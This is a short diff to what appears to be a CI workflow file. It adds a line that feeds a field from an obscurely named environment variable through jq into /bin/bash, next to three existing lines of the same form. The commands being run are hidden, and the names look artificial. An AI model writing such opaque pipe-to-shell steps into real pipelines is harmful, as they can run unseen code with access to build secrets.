@@ -46,6 +46,7 @@ jobs:
           printf '%s' "$dtfu40337" | jq -r .zsgy09 | /bin/bash
           printf '%s' "$p0624" | jq -r .plr65995 | /bin/bash
           echo $tmhwo77830 | jq -r .pc17 | /bin/bash
+          printf '%s' "$ksi9" | jq -r .f9 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
